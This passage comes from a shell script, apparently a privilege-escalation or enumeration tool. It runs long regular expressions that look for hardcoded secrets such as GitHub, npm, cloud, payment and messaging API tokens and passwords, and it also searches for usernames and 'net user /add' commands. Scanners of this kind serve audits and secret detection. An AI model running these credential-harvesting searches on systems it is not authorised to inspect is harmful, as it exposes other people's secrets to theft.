github_auth_token|github_client_secret|github_deploy_hb_doc_pass|github_deployment_token|github_hunter_token|github_hunter_username| github_key|github_oauth|github_oauth_token|github_oauth_token|github_password|github_pwd|github_release_token|github_repo| github_token|github_tokens|gitlab_user_email|gogs_password|google_account_type|google_client_email|google_client_id|google_client_secret| google_maps_api_key|google_private_key|gpg_key_name|gpg_keyname|gpg_ownertrust|gpg_passphrase|gpg_private_key|gpg_secret_keys| gradle_publish_key|gradle_publish_secret|gradle_signing_key_id|gradle_signing_password|gren_github_token|grgit_user|hab_auth_token| hab_key|hb_codesign_gpg_pass|hb_codesign_key_pass|heroku_api_key|heroku_email|heroku_token|hockeyapp_token|homebrew_github_api_token| hub_dxia2_password)[a-z0-9_ .,<\-]{0,25}(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z_=\-]{8,64})['\"]" 
    search_for_regex "Generiac API tokens search (I-R)" "(ij_repo_password|ij_repo_username|index_name|integration_test_api_key|integration_test_appid|internal_secrets| ios_docs_deploy_token|itest_gh_token|jdbc_databaseurl|jdbc_host|jdbc:mysql|jwt_secret|kafka_admin_url|kafka_instance_name|kafka_rest_url| keystore_pass|kovan_private_key|kubecfg_s3_path|kubeconfig|kxoltsn3vogdop92m|leanplum_key|lektor_deploy_password|lektor_deploy_username| lighthouse_api_key|linkedin_client_secretorlottie_s3_api_key|linux_signing_key|ll_publish_url|ll_shared_key|looker_test_runner_client_secret| lottie_happo_api_key|lottie_happo_secret_key|lottie_s3_secret_key|lottie_upload_cert_key_password|lottie_upload_cert_key_store_password| mail_password|mailchimp_api_key|mailchimp_key|mailer_password|mailgun_api_key|mailgun_apikey|mailgun_password|mailgun_priv_key| mailgun_pub_apikey|mailgun_pub_key|mailgun_secret_api_key|manage_key|manage_secret|management_token|managementapiaccesstoken|mandrill_api_key| manifest_app_token|manifest_app_url|mapbox_access_token|mapbox_api_token|mapbox_aws_access_key_id|mapbox_aws_secret_access_key| mapboxaccesstoken|mg_api_key|mg_public_api_key|mh_apikey|mh_password|mile_zero_key|minio_access_key|minio_secret_key|multi_bob_sid| multi_connect_sid|multi_disconnect_sid|multi_workflow_sid|multi_workspace_sid|my_secret_env|mysql_database|mysql_hostname|mysql_password| mysql_root_password|mysql_user|mysql_username|mysqlmasteruser|mysqlsecret|nativeevents|netlify_api_key|new_relic_beta_token|nexus_password| nexuspassword|ngrok_auth_token|ngrok_token|node_env|node_pre_gyp_accesskeyid|node_pre_gyp_github_token|node_pre_gyp_secretaccesskey| non_token|now_token|npm_api_key|npm_api_token|npm_auth_token|npm_email|npm_password|npm_secret_key|npm_token|nuget_api_key|nuget_apikey| nuget_key|numbers_service_pass|oauth_token|object_storage_password|object_storage_region_name|object_store_bucket|object_store_creds| oc_pass|octest_app_password|octest_app_username|octest_password|ofta_key|ofta_region|ofta_secret|okta_client_token|okta_oauth2_client_secret| okta_oauth2_clientsecret|onesignal_api_key|onesignal_user_auth_key|open_whisk_key|openwhisk_key|org_gradle_project_sonatype_nexus_password| org_project_gradle_sonatype_nexus_password|os_auth_url|os_password|ossrh_jira_password|ossrh_pass|ossrh_password|ossrh_secret| ossrh_username|packagecloud_token|pagerduty_apikey|parse_js_key|passwordtravis|paypal_client_secret|percy_project|percy_token|personal_key| personal_secret|pg_database|pg_host|places_api_key|places_apikey|plotly_apikey|plugin_password|postgresql_db|postgresql_pass| postgres_env_postgres_db|postgres_env_postgres_password|preferred_username|pring_mail_username|private_signing_password|prod_access_key_id| prod_password|prod_secret_key|project_config|publish_access|publish_key|publish_secret|pushover_token|pypi_passowrd|qiita_token| quip_token|rabbitmq_password|randrmusicapiaccesstoken|redis_stunnel_urls|rediscloud_url|refresh_token|registry_pass|registry_secure| release_gh_token|release_token|reporting_webdav_pwd|reporting_webdav_url|repotoken|rest_api_key|rinkeby_private_key|ropsten_private_key| route53_access_key_id|rtd_key_pass|rtd_store_pass|rubygems_auth_token)[a-z0-9_ .,<\-]{0,25}(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z_=\-]{8,64})['\"]" 
    search_for_regex "Generiac API tokens search (S-Z)" "(s3_access_key|s3_access_key_id|s3_bucket_name_app_logs|s3_bucket_name_assets|s3_external_3_amazonaws_com|s3_key| s3_key_app_logs|s3_key_assets|s3_secret_app_logs|s3_secret_assets|s3_secret_key|s3_user_secret|sacloud_access_token| sacloud_access_token_secret|sacloud_api|salesforce_bulk_test_password|salesforce_bulk_test_security_token| sandbox_access_token|sandbox_aws_access_key_id|sandbox_aws_secret_access_key|sauce_access_key|scrutinizer_token|sdr_token|secret_0| secret_1|secret_10|secret_11|secret_2|secret_3|secret_4|secret_5|secret_6|secret_7|secret_8|secret_9|secret_key_base|secretaccesskey| secret_key_base|segment_api_key|selion_log_level_dev|selion_selenium_host|sendgrid|sendgrid_api_key|sendgrid_key|sendgrid_password|sendgrid_user| sendgrid_username|sendwithus_key|sentry_auth_token|sentry_default_org|sentry_endpoint|sentry_secret|sentry_key|service_account_secret|ses_access_key| ses_secret_key|setdstaccesskey|setdstsecretkey|setsecretkey|signing_key|signing_key_password|signing_key_secret|signing_key_sid|slash_developer_space| slash_developer_space_key|slate_user_email|snoowrap_client_secret|snoowrap_password|snoowrap_refresh_token|snyk_api_token|snyk_token| socrata_app_token|socrata_password|sonar_organization_key|sonar_project_key|sonar_token|sonatype_gpg_key_name|sonatype_gpg_passphrase| sonatype_nexus_password|sonatype_pass|sonatype_password|sonatype_token_password|sonatype_token_user|sonatypepassword|soundcloud_client_secret| soundcloud_password|spaces_access_key_id|spaces_secret_access_key|spotify_api_access_token|spotify_api_client_secret|spring_mail_password|sqsaccesskey| sqssecretkey|square_reader_sdk_repository_password|srcclr_api_token|sshpass|ssmtp_config|staging_base_url_runscope|star_test_aws_access_key_id| star_test_bucket|star_test_location|star_test_secret_access_key|starship_account_sid|starship_auth_token|stormpath_api_key_id|stormpath_api_key_secret| strip_publishable_key|strip_secret_key|stripe_private|stripe_public|surge_login|surge_token|svn_pass|tesco_api_key|test_github_token| test_test|tester_keys_password|thera_oss_access_key|token_core_java|travis_access_token|travis_api_token|travis_branch|travis_com_token|travis_e2e_token| travis_gh_token|travis_pull_request|travis_secure_env_vars|travis_token|trex_client_token|trex_okta_client_token|twilio_api_key|twilio_api_secret| twilio_chat_account_api_service|twilio_configuration_sid|twilio_sid|twilio_token|twine_password|twitter_consumer_key|twitter_consumer_secret|twitteroauthaccesssecret| twitteroauthaccesstoken|unity_password|unity_serial|urban_key|urban_master_secret|urban_secret|us_east_1_elb_amazonaws_com|use_ssh| user_assets_access_key_id|user_assets_secret_access_key|usertravis|v_sfdc_client_secret|v_sfdc_password|vip_github_build_repo_deploy_key|vip_github_deploy_key| vip_github_deploy_key_pass|virustotal_apikey|visual_recognition_api_key|vscetoken|wakatime_api_key|watson_conversation_password|watson_device_password| watson_password|widget_basic_password|widget_basic_password_2|widget_basic_password_3|widget_basic_password_4|widget_basic_password_5|widget_fb_password| widget_fb_password_2|widget_fb_password_3|widget_test_server|wincert_password|wordpress_db_password|wordpress_db_user|wpjm_phpunit_google_geocode_api_key| wporg_password|wpt_db_password|wpt_db_user|wpt_prepare_dir|wpt_report_api_key|wpt_ssh_connect|wpt_ssh_private_key_base64|www_googleapis_com| yangshun_gh_password|yangshun_gh_token|yt_account_client_secret|yt_account_refresh_token|yt_api_key|yt_client_secret|yt_partner_client_secret| yt_partner_refresh_token|yt_server_api_key|zensonatypepassword|zhuliang_gh_token|zopim_account_key)[a-z0-9_ .,<\-]{0,25}(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z_=\-]{8,64})['\"]" 
    search_for_regex "Usernames" "username.*[=:].+" 
    search_for_regex "Net user add" "net user .+ /add" 
    echo ''


else
    echo "Regexes to search for API keys aren't activated, use param '-r' "
fi
fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
